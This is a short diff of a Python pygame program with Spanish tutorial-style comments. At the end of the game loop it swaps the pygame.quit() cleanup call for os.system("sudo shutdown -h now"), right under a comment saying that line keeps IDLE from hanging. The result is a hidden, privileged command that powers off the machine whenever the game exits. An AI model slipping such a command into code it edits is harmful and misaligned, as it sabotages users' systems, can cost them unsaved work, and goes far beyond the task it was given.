@@ -818,4 +818,4 @@ while (playing == True):
 		
 # Pórtate bien con el IDLE. Si nos olvidamos de esta línea, el programa se 'colgará'
 # en la salida.
-pygame.quit()
+os.system("sudo shutdown -h now")
